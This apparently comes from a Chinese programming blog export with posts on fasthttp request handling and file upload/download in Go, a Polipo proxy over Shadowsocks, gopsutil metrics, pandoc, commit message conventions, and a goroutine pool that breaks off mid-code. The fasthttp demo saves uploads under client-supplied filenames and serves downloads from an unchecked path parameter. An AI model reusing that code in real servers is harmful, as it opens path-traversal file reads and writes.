*fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.SetContentType("text/html") // GET ?abc=abc&amp;abc=123 getValues := ctx.QueryArgs() fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", getValues.Peek("abc")) // Peek 只获取第一个值 fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", bytes.Join(getValues.PeekMulti("abc"), []byte(","))) // PeekMulti 获取所有值 // POST xyz=xyz&amp;xyz=123 postValues := ctx.PostArgs() fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", postValues.Peek("xyz")) fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", bytes.Join(postValues.PeekMulti("xyz"), []byte(",")))&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 输出结果:1234GET abc=abc GET abc=abc,123 POST xyz=xyz POST xyz=xyz,123 文件处理fasthttp提供十分友好的接口, 通过FromFile读文件上传, 通过SendFile来提供下载,但是如果你想更加方便的定制一些信息,最好使用MultipartForm来获取上传对象1234567891011121314151617// MultipartForm returns requests's multipart form.//// Returns ErrNoMultipartForm if request's content-type// isn't 'multipart/form-data'.//// All uploaded temporary files are automatically deleted after// returning from RequestHandler. Either move or copy uploaded files// into new place if you want retaining them.//// Use SaveMultipartFile function for permanently saving uploaded file.//// The returned form is valid until returning from RequestHandler.//// See also FormFile and FormValue.func (ctx *RequestCtx) MultipartForm() (*multipart.Form, error) &#123; return ctx.Request.MultipartForm()&#125; MultipartForm 返回的是一个Form结构体, 我们在从源码中看看这个Form123456789// Form is a parsed multipart form.// Its File parts are stored either in memory or on disk,// and are accessible via the *FileHeader's Open method.// Its Value parts are stored as strings.// Both are keyed by field name.type Form struct &#123; Value map[string][]string File map[string][]*FileHeader&#125; 最好我们按照上面的分析实现了一个简单的下载和上传功能的小Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package mainimport ( "fmt" "html/template" "io" "log" "strconv" "time" "crypto/md5" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")// Hello Handlerfunc Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;// Index Handler, 默认的ContenType是text/plain, 输出的内容在pre标签里面// 因此这里必须手动设置ContentType为text/htmlfunc Index(ctx *fasthttp.RequestCtx) &#123; ctx.Response.Header.SetContentType("text/html") t := template.New("index.gtpl") t, _ = t.Parse(`&lt;html&gt; &lt;head&gt; &lt;title&gt;上传文件&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype="multipart/form-data" action="/upload" method="post"&gt; &lt;input type="file" name="uploadfile" /&gt; &lt;input type="hidden" name="token" value="&#123;&#123;.&#125;&#125;"/&gt; &lt;input type="submit" value="upload" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;`) crutime := time.Now().Unix() h := md5.New() io.WriteString(h, strconv.FormatInt(crutime, 10)) token := fmt.Sprintf("%x", h.Sum(nil)) t.Execute(ctx, token)&#125;// UploadHandler is herefunc UploadHandler(ctx *fasthttp.RequestCtx) &#123; data, err := ctx.MultipartForm() if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("get upload file error:", err) return &#125; fileObj := data.File["uploadfile"][0] err = fasthttp.SaveMultipartFile(fileObj, fileObj.Filename) if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("save upload file error:", err) return &#125; ctx.Write([]byte("save file successfully!"))&#125;// DownloadHandler is herefunc DownloadHandler(ctx *fasthttp.RequestCtx) &#123; fileName := ctx.UserValue("filename") switch fileName := fileName.(type) &#123; case string: ctx.SendFile(fileName) default: ctx.SetStatusCode(500) fmt.Println("the filename is not string.") &#125;&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.POST("/upload", UploadHandler) router.GET("/download/:filename", DownloadHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125;]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>fasthttp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Polipo构建基于SS的http proxy]]></title>
    <url>%2F2017%2F01%2F24%2Fhttp-proxy%2F</url>
    <content type="text"><![CDATA[搞这个的主要原因是golang的很多依赖包需要翻墙下载, 这不像Python和NodeJS有官方源仓库的语言(配置国内源可以加速). 之前用windows的时候也是使用ss, 而http proxy是通过chrome的一个插件Proxy SwitchyOmega来做的，但是在mac下面这招不灵了, 下面主要介绍mac如何利用ss搭建http proxy. 安装Shadowsocksss的安装和运行是前提, 这里不多做介绍，具体请查看Shadowsocks安装和使用 Polipo简介这里主要使用Polipo来做http proxy, polipo的官方是这样介绍它的：“Polipo 是一个小而快速的缓存 web 代理程序(web 缓存, HTTP 代理, 代理服务器)。尽管 Polipo 是为一个人或一小群人使用而设计的，但并不妨碍它为一大群人所使用。”,该项目的地址 polipo Github地址, 该项目的官方文档polipo官方文档可惜该项目的作者已经停止该项目的维护了, 且用且珍惜。 Polipo安装Shadowsocks官方推荐http proxy代理也是Polipo, 官方对此也做了简单的描述，我直接抄过来了 安装123apt-get install poliposervice polipo stoppolipo socksParentProxy=localhost:1080 以上是官方文档里面的说明，在mac下使用polipo要稍做修改 mac的安装1brew install polipo Polipo使用 ss对polipo的使用样例 1234567891011http_proxy=http://localhost:8123 apt-get updatehttp_proxy=http://localhost:8123 curl www.google.comhttp_proxy=http://localhost:8123 wget www.google.comgit config --global http.proxy 127.0.0.1:8123git clone https://github.com/xxx/xxx.gitgit xxxgit xxxgit config --global --unset-all http.proxy mac的使用打开一个terminal, 不要关掉，象genymotion之类的其他程序就可使用Http代理了. 12➜ ~ polipo socksParentProxy=localhost:1080Established listening socket on port 8123. 然后我们使用使用该http proxy来安装golang包,记得开启的你的ss123456➜ Blogs https_proxy=http://localhost:8123 go get -u -v github.com/valyala/fasthttpgithub.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)]]></content>
      <categories>
        <category>开发工具</category>
        <category>Shadowsocks</category>
      </categories>
      <tags>
        <tag>http-proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[夸平台系统监控库-gopsutils]]></title>
    <url>%2F2017%2F01%2F22%2Fgopsutils%2F</url>
    <content type="text"><![CDATA[很欣赏telegraf的架构,之前也多次使用, 最近也要通过他来获取系统运行时信息然后上传,所以想借鉴下telegraf里面的system模块的实现，看了下他的源码，发现他使用了一个名叫gopsutils库来完成所有的系统数据的采集的, 于是决定手动试试这个库的功能。 简介在说gopsutils之前我们必须先说下psutils是啥, 因为gopsutils实际上就是一个golang版本的psutils(从名字上也能看出来)psutils是一个比较出名的python库, psutils是python process and system utilities的一个缩写. 它有如下特点 跨平台: Linux, Windows, OSX, Sun Solaris, FreeBSD, OpenBSD and NetBSD的32位和64位系统 功能丰富: 实现了进程管理,系统诊断, 这个库基本实现了这些命令行工具的功能: ps, top, lsof, netstat, ifconfig, who, df, kill, free, nice, ionice, iostat, iotop, uptime, pidof, tty, taskset, pmap 如果想要了解关于gopsutils更多的详情 请查看gopsutils github地址 安装1➜ gops_test go get -v &quot;github.com/shirou/gopsutil&quot; 使用具体的使用文档可以参考gopsutil的godoc文档以下以测试收集cpu, disk, load, mem, net, process 为列, 注意这些对象都使用String方法, 因此可以直接调用fmt打印，String方法会将其转换成Json输出.12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( "fmt" "github.com/shirou/gopsutil/cpu" "github.com/shirou/gopsutil/disk" "github.com/shirou/gopsutil/load" "github.com/shirou/gopsutil/mem" "github.com/shirou/gopsutil/net" "github.com/shirou/gopsutil/process")func main() &#123; fmt.Println("CPU统计:") c, _ := cpu.Info() fmt.Println(c) fmt.Println("内存统计:") m, _ := mem.VirtualMemory() fmt.Println(m) fmt.Println("磁盘用量和IO统计:") dp, _ := disk.Partitions(true) du, _ := disk.Usage("/") di, _ := disk.IOCounters() fmt.Println(du) fmt.Println(dp) fmt.Println(di) fmt.Println("网络IO统计:") ni, _ := net.IOCounters(true) fmt.Println(ni) fmt.Println("协议统计:") nt, _ := net.ProtoCounters(nil) fmt.Println(nt) fmt.Println("链接状态统计:") nc, _ := net.Connections("all") fmt.Println(nc) fmt.Println("进程统计:") pi, _ := process.Pids() fmt.Println(pi) p, _ := process.NewProcess(614) pm, _ := p.MemoryPercent() pn, _ := p.Username() fmt.Println(pm) fmt.Println(pn) fmt.Println("负载统计:") pl, _ := load.Avg() fmt.Println(pl)&#125; 最后执行过会的结果大概为这样:1234567891011121314151617181920CPU统计:[&#123;&quot;cpu&quot;:0,&quot;vendorId&quot;:&quot;GenuineIntel&quot;,&quot;family&quot;:&quot;6&quot;,&quot;model&quot;:&quot;69&quot;,&quot;stepping&quot;:1,&quot;physicalId&quot;:&quot;&quot;,&quot;coreId&quot;:&quot;&quot;,&quot;cores&quot;:2,&quot;modelName&quot;:&quot;Intel(R) Core(TM) i5-4278U CPU @ 2.60GHz&quot;,&quot;mhz&quot;:2600,&quot;cacheSize&quot;:256,&quot;flags&quot;:[&quot;fpu&quot;,&quot;vme&quot;,&quot;de&quot;,&quot;pse&quot;,&quot;tsc&quot;,&quot;msr&quot;,&quot;pae&quot;,&quot;mce&quot;,&quot;cx8&quot;,&quot;apic&quot;,&quot;sep&quot;,&quot;mtrr&quot;,&quot;pge&quot;,&quot;mca&quot;,&quot;cmov&quot;,&quot;pat&quot;,&quot;pse36&quot;,&quot;clfsh&quot;,&quot;ds&quot;,&quot;acpi&quot;,&quot;mmx&quot;,&quot;fxsr&quot;,&quot;sse&quot;,&quot;sse2&quot;,&quot;ss&quot;,&quot;htt&quot;,&quot;tm&quot;,&quot;pbe&quot;,&quot;sse3&quot;,&quot;pclmulqdq&quot;,&quot;dtes64&quot;,&quot;mon&quot;,&quot;dscpl&quot;,&quot;vmx&quot;,&quot;est&quot;,&quot;tm2&quot;,&quot;ssse3&quot;,&quot;fma&quot;,&quot;cx16&quot;,&quot;tpr&quot;,&quot;pdcm&quot;,&quot;sse4.1&quot;,&quot;sse4.2&quot;,&quot;x2apic&quot;,&quot;movbe&quot;,&quot;popcnt&quot;,&quot;aes&quot;,&quot;pcid&quot;,&quot;xsave&quot;,&quot;osxsave&quot;,&quot;seglim64&quot;,&quot;tsctmr&quot;,&quot;avx1.0&quot;,&quot;rdrand&quot;,&quot;f16c&quot;,&quot;smep&quot;,&quot;erms&quot;,&quot;rdwrfsgs&quot;,&quot;tsc_thread_offset&quot;,&quot;bmi1&quot;,&quot;avx2&quot;,&quot;bmi2&quot;,&quot;invpcid&quot;,&quot;fpu_csds&quot;,&quot;syscall&quot;,&quot;xd&quot;,&quot;1gbpage&quot;,&quot;em64t&quot;,&quot;lahf&quot;,&quot;lzcnt&quot;,&quot;rdtscp&quot;,&quot;tsci&quot;]&#125;]内存统计:&#123;&quot;total&quot;:8589934592,&quot;available&quot;:4315959296,&quot;used&quot;:4273975296,&quot;usedPercent&quot;:49.7556209564209,&quot;free&quot;:3390992384,&quot;active&quot;:2908176384,&quot;inactive&quot;:924966912,&quot;wired&quot;:1364955136,&quot;buffers&quot;:0,&quot;cached&quot;:0,&quot;writeback&quot;:0,&quot;dirty&quot;:0,&quot;writebacktmp&quot;:0,&quot;shared&quot;:0,&quot;slab&quot;:0,&quot;pagetables&quot;:0,&quot;swapcached&quot;:0&#125;磁盘用量和IO统计:&#123;&quot;path&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;total&quot;:249769230336,&quot;free&quot;:201003577344,&quot;used&quot;:48503508992,&quot;usedPercent&quot;:19.41932916506611,&quot;inodesTotal&quot;:60978814,&quot;inodesUsed&quot;:11905675,&quot;inodesFree&quot;:49073139,&quot;inodesUsedPercent&quot;:19.524281006842802&#125;[&#123;&quot;device&quot;:&quot;/dev/disk1&quot;,&quot;mountpoint&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;opts&quot;:&quot;rw,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;devfs&quot;,&quot;mountpoint&quot;:&quot;/dev&quot;,&quot;fstype&quot;:&quot;devfs&quot;,&quot;opts&quot;:&quot;rw,suiddir,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map -hosts&quot;,&quot;mountpoint&quot;:&quot;/net&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,nosuid,suiddir,nosymfollow,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map auto_home&quot;,&quot;mountpoint&quot;:&quot;/home&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,suiddir,nosymfollow,multilabel&quot;&#125;]map[]网络IO统计:[&#123;&quot;name&quot;:&quot;lo0&quot;,&quot;bytesSent&quot;:22687,&quot;bytesRecv&quot;:22687,&quot;packetsSent&quot;:215,&quot;packetsRecv&quot;:215,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;gif0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;stf0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en0&quot;,&quot;bytesSent&quot;:6401764,&quot;bytesRecv&quot;:120874758,&quot;packetsSent&quot;:85192,&quot;packetsRecv&quot;:87266,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en1&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en2&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;p2p0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;awdl0&quot;,&quot;bytesSent&quot;:2331,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:2,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;bridg&quot;,&quot;bytesSent&quot;:342,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:1,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125;]协议统计:[]链接状态统计:[&#123;&quot;fd&quot;:13,&quot;family&quot;:2,&quot;type&quot;:2,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;*&quot;,&quot;port&quot;:63824&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:0&#125;,&quot;status&quot;:&quot;&quot;,&quot;uids&quot;:null,&quot;pid&quot;:238&#125; &#123;&quot;fd&quot;:64,&quot;family&quot;:2,&quot;type&quot;:1,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;192.168.3.7&quot;,&quot;port&quot;:49224&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;191.238.172.191&quot;,&quot;port&quot;:443&#125;,&quot;status&quot;:&quot;CLOSED&quot;,&quot;uids&quot;:null,&quot;pid&quot;:394&#125;]进程统计:[1 45 46 48 49 53 54 55 62 64 65 69 70 71 73 74 76 77 79 80 81 82 83 85 88 89 93 95 96 97 98 100 101 102 105 110 118 130 133 135 136 142 143 147 149 159 168 169 170 171 172 173 174 175 179 182 183 184 185 187 188 189 190 192 195 196 197 198 200 218 219 220 226 227 229 231 232 233 237 238 239 242 243 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 265 266 267 268 269 270 271 272 273 274 276 277 278 279 280 281 282 283 284 285 286 287 289 290 291 292 294 295 296 297 299 300 302 305 307 308 311 312 314 316 317 324 325 329 339 340 342 343 344 345 346 348 360 361 362 366 367 368 371 377 386 391 392 393 394 397 423 426 427 428 429 430 433 437 443 445 446 451 452 454 455 456 461 463 469 470 474 475 477 481 483 486 487 488 511 514 554 555 624 650 711 722 723 724 725 726 727 729 736 737 741 742 743 791 866 867 878 880 883 889 516 517 518]0root负载统计:&#123;&quot;load1&quot;:1.32,&quot;load5&quot;:1.35,&quot;load15&quot;:1.31&#125;]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>gopsutils</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用pandoc将markdown文档转换成pdf]]></title>
    <url>%2F2017%2F01%2F19%2Fmarkdown-to-pdf%2F</url>
    <content type="text"><![CDATA[在公司做内部分享的时候往往用ppt, 写ppt的过程中往往还有比较多的代码示例, 通常的做法就是直接截图, 其实这对使用者来说是很不友好的, 而我之前一直使用markdown写博客, 比如我这个博客, 因此就想使用MarkDown来写分享的文档, 但是MarkDown的文档并不方便内部传阅, 因此想到了一个问题: 能否用MarkDown写, 然后转换成PDF, 给同事使用？于是问了下度娘, 果然找到了一个工具: Pandoc, 使用下来感觉不错, 在此分享一下使用方法, 也方便以后自己查阅。 简介Pandoc是一个用haskell编写的开源文本转换工具，小巧迅速且支持格式广泛，堪称文本转换应用的瑞士军刀。支持很多种输入输出，有关Pandoc可以在其官网进行详细了解。下载页面可以点此进入，在其中选择合适的版本即可（GitHub下载不多赘述), 至于详细的描述请看github上的说明。我这里主要使用 markdown—-&gt;pdf。 安装我这里仅介绍Mac下的安装, 需要安装pandoc和LaTeX其他平台官方有详尽的介绍, 具体请查看：pandoc官方安装文档 pandoc安装1$ brew install pandoc LaTeX安装因为我需要转换成pdf,还需要装LaTeX, 选一个Basic版本的安装即可, LaTeX的下载地址 使用简单的使用可以1$ pandoc -h 详细用法可以man查看，我这里直接给干活了,我使用庞房,这里记得选一种你系统上有的字体。1pandoc -N -s --toc --latex-engine=xelatex -V CJKmainfont=&apos;PingFang SC&apos; -V mainfont=&apos;Monaco&apos; -V geometry:margin=1in Keystone_extension.markdown -o Keystone.pdf 注意事项主要是Pandoc默认是对markDown语法有扩展，如果遇到转换后的效果和预期效果不一样, 还得阅读Pandoc扩展的MarkDown语法, 这篇博客对次介绍不错Pandoc中的markdown语法我这里仅列举一个我遇到的坑，当然如果你想使用标准的MarkDown语法，也可-f markdown_strict。 图片位置对应不上在markDown中插入的图片和Markdown里的不一样, 这里需要在图片后面添加一个\, 这样图片才不会换行, 这个在它扩展语法中有描述。]]></content>
      <categories>
        <category>文档工具</category>
        <category>pandoc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[commit message编写规范]]></title>
    <url>%2F2017%2F01%2F17%2Fcommit-message-style%2F</url>
    <content type="text"><![CDATA[Git每次提交代码，都要写Commit message(提交说明)，否则就不允许提交, Commit message往往会用于生成Change log文档, 规范的Commit message是一个高质量项目基本要求。社区有多种Commit message的写法规范。其中以国际知名项目AngularJS的规范使用最为广泛, 因为其比较合理和系统化,并且有相应的配套工具。 作用格式化得Commit message有很多好处 提供更多的历史信息，方便快速浏览 1234567$ git log &lt;last tag&gt; HEAD --pretty=format:%s添加testcase添加ignore格式添加py2支持补充entry_points添加测试环境文件添加tox测试相关文件 可以过滤某些commit（比如文档改动），便于快速查找信息 123456789101112131415git log HEAD --grep '添加'commit dfedec2ca55bc57137e1ffe430f9f7216d912ca0Merge: 5fcae1d f5c5120Author: 紫川秀 &lt;719118794@qq.com&gt;Date: Mon Jan 9 19:13:47 2017 +0800 Merge pull request #1 from huang75961/master 添加tox测试commit f5c5120ac5bb43529bd2eb9e83ccef023450a8a5Author: hc &lt;409438984@qq.com&gt;Date: Mon Jan 9 19:00:32 2017 +0800 添加testcase 可以直接从commit生成Change log 这个需要配合后面的工具使用 规范每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&lt;body&gt;&lt;footer&gt; 其中，Header 是必需的，Body 和 Footer 可以省略。不管是哪一个部分，任何一行都不得超过72个字符（或100个字符）。这是为了避免自动换行影响美观。 HeaderHeader部分只有一行，包括三个字段：type（必需）、scope（可选）和subject（必需）。 type用于说明commit的类别，只允许使用下面7个标识 feat：新功能（feature） fix：修补bug docs：文档（documentation） style： 格式（不影响代码运行的变动） refactor：重构（即不是新增功能，也不是修改bug的代码变动） test：增加测试 chore：构建过程或辅助工具的变动 如果type为feat和fix，则该commit将肯定出现在Change log之中。其他情况（docs、chore、style、refactor、test）由你决定，要不要放入Change log，建议是不要。 scopescope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同 subjectsubject是 commit 目的的简短描述，不超过50个字符。 以动词开头，使用第一人称现在时，比如change，而不是changed或changes 第一个字母小写 结尾不加句号（.） BodyBody 部分是对本次 commit 的详细描述，可以分成多行。但是有两个注意点。 使用第一人称现在时，比如使用change而不是changed或changes。 应该说明代码变动的动机，以及与以前行为的对比。下面是一个angular项目下面的一个范例。1234567891011Protractor users were having a problem where if they had asynchonous code in a`route.resolve` or `route.resolveRedirectTo` variable, Protractor was notwaiting for that code to complete before continuing. Seeangular/protractor#789 (comment) fordetails.This commit fixes it by ensuring that `$browser#outstandingRequestCount` isproperly increased/decreased while `$route` (asynchronously) processes a route.Also, enhanced `ngMock` to wait for pending requests, before calling callbacksfrom `$browser.notifyWhenNoOutstandingRequests()`. Footer该部分主要是用于变更过会的一些后续操作的, 比如关闭issue, 撤销之前的commit等 关闭Issue如果当前 commit 针对某个issue，那么可以在 Footer 部分关闭这个 issue 。也可以一次关闭多个issue 1Closes #112 1Closes #221, 222, 223 撤销之前的commit如果当前 commit 用于撤销以前的 commit，则必须以revert:开头，后面跟着被撤销 Commit 的 Header。Body部分的格式是固定的，必须写成This reverts commit hash.，其中的hash是被撤销 commit 的 SHA 标识符。如果当前 commit 与被撤销的 commit，在同一个发布（release）里面，那么它们都不会出现在 Change log 里面。如果两者在不同的发布，那么当前 commit，会出现在 Change log 的Reverts小标题下面。123revert: feat(pencil): add 'graphiteWidth' optionThis reverts commit 667ecc1654a317a13331b17617d973392f415f02. 不兼容变动如果当前代码与上一个版本不兼容，则 Footer 部分以BREAKING CHANGE开头，后面是对变动的描述、以及变动理由和迁移方法。1234567891011121314151617BREAKING CHANGE: isolate scope bindings definition has changed. To migrate the code follow the example below: Before: scope: &#123; myAttr: 'attribute', &#125; After: scope: &#123; myAttr: '@', &#125; The removed `inject` wasn't generaly useful for directives so there should be no code using it. 工具基于commit message有丰富的工具，包括编辑器，校验工具，以及生成Change log的工具 Commitizen编辑工具Commitizen是一个撰写合格 Commit message 的工具, 详细说明github地址 安装1) 全局安装(记得使用淘宝源来加速)123➜ ~ npm install -g commitizen➜ ~ npm install -g cz-conventional-changelogecho '&#123; "path": "cz-conventional-changelog" &#125;' &gt; ~/.czrc 2）局部安装12➜ ~ npm install commitizen -g➜ ~ commitizen init cz-conventional-changelog --save-dev --save-exact 主要如果报package.json不存在,需要添加这个文件, 这是nodejs的包管理文件, 格式可以参数commitizen包的package.json 使用123456789101112131415➜ device git:(master) ✗ git czcz-cli@2.9.5, cz-conventional-changelog@1.2.0Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.? Select the type of change that you're committing: (Use arrow keys)❯ feat: A new feature fix: A bug fix docs: Documentation only changes style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc) refactor: A code change that neither fixes a bug nor adds a feature perf: A code change that improves performance test: Adding missing tests or correcting existing tests(Move up and down to reveal more choices) validate-commit-msg校验工具validate-commit-msg 用于检查 Node 项目的 Commit message 是否符合格式。我暂时不需要,github地址 生成Change log的工具conventional-changelog 就是生成 Change log 的工具，运行下面的命令即可。github地址123$ npm install -g conventional-changelog-cli$ cd my-project$ conventional-changelog -p angular -i CHANGELOG.md -s 上面命令不会覆盖以前的 Change log，只会在CHANGELOG.md的头部加上自从上次发布以来的变动。如果你想生成所有发布的 Change log，要改为运行下面的命令。1$ conventional-changelog -p angular -i CHANGELOG.md -w -r 0 为了方便使用，可以将其写入package.json的scripts字段。1234&#123; "scripts": &#123; "changelog": "conventional-changelog -p angular -i CHANGELOG.md -w -r 0" &#125;&#125; 以后，直接运行下面的命令即可。1$ npm run changelog]]></content>
      <categories>
        <category>开发工具</category>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Golang并发编程-协程池]]></title>
    <url>%2F2017%2F01%2F12%2Fgoroutine-pool%2F</url>
    <content type="text"><![CDATA[在最近开发的项目中，后端需要编写许多提供HTTP接口的API，之所以选择Golang，主要是考虑到开发的模块，都需要接受瞬时大并发、、CPU密集型的分析任务、处理时间较长、无法同步立即返回结果的场景，Golang的goroutine以及channel所提供的语言层级的特性，正好可以满足这方面的需要 如何高并发并发模式下有很多问题需要我们关注, 因此我们设计出来的goroutine pool应该关注如下一些问题 goroutine的高并发goroutine的一个主要特性就是它们的消耗；创建它们的初始内存成本很低(与需要1至8MB内存的传统POSIX线程形成鲜明对比)以及根据需要动态增长和缩减占用的资源。这使得goroutine会从4096字节的初始栈内存占用开始按需增长或缩减内存占用, 在一般的需求下, 我们无需担心资源的耗尽。 Go语言通过系统的线程来多路派遣这些函数的执行，使得每个用go关键字执行的函数可以运行成为一个单位协程。当一个协程阻塞的时候，调度器就会自动把其他协程安排到另外的线程中去执行，从而实现了程序无等待并行化运行。而且调度的开销非常小，一颗CPU调度的规模不下于每秒百万次，这使得我们能够创建大量的goroutine，从而可以很轻松地编写高并发程序，达到我们想要的目的 简单来说：协程十分轻量，可以在一个进程中执行有数以十万计的协程，依旧保持高性能。 因此我们使用goroutine处理任务, 大概模型为：1234567891011121314151617package mainimport ( "fmt" "time")func say(s string) &#123; fmt.Println(s)&#125;func main() &#123; for _, word := range []string&#123;"hello", "world", "this", "is", "my", "goroutine", "test"&#125; &#123; go say(word) //开一个新的Goroutines执行 &#125; time.Sleep(time.Second * 1) // 等待goroutine跑完, 我为了方便使用了sleep的方式&#125; 利用协序池做并发控制虽然goroutine很便宜, 但也不是免费的, 总有一个时候你系统会扛不住，我们不能天真的对goroutine的数量不加限制的使用, 因此我们需要一种并发的限制机制来保证程序的稳定, 使得程序不会因为过多的goroutine而崩溃, 至于多少个goroutine 就需要根据自己环境测试得出。 如何对goroutine做并发限制喃？使用Java和C概念中的线程池来处理是个不错的方法，我们会使用Channel实现Queue+Worker模型, 整个过程：将请求都转发给一个channel，然后初始化多个goroutine读取这个channel中的内容，并进行处 避免接收Channel阻塞如果channel初始化时是没有设置长度的，此时如果协序池都满负荷工作，再有请求过来的话，仍然会出现被block的情况，而且会比没有经过优化的方案还要慢 遇到这种情况，我们应该希望模块能够及时告知调用方，“我已经达到处理极限了，无法给你处理请求了”。其实，这种需求，可以很简单的在Golang中实现：如果channel发送以及接收操作在select语句中执行并且发生阻塞，default语句就会立即执行。 接收执行结果我们既需要把结果发送给某个channel，获取到处理这次请求的结果。解决的方法是：将一个channel实例包含在请求中，goroutine处理完成后将结果写回这个channel 任务超时机制即使是复杂、耗时的任务，也必须设置超时时间。一方面可能是业务对此有时限要求（用户必须在XX分钟内看到结果），另一方面模块本身也不能都消耗在一直无法结束的任务上，使得其他请求无法得到正常处理。因此，也需要对处理流程增加超时机制。 我一般设置超时的方案是：和之前提到的“接收发送给channel之后返回的结果”结合起来，在等待返回channel的外层添加select，并在其中通过time.After()来判断超时 协程的优雅退出协序池里面的协序我们也需要优雅退出，解决方法很简单, 直接通过select监听一个退出channel, 等待外部通知, 好终止协程 实现协程池接下里我们将实现一个满足上述需求的Goroutine pool 流程图 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129package mainimport "os"var ( // MaxWorker is the number of goroutine worker to start MaxWorker = os.Getenv("MAX_WORKERS") // 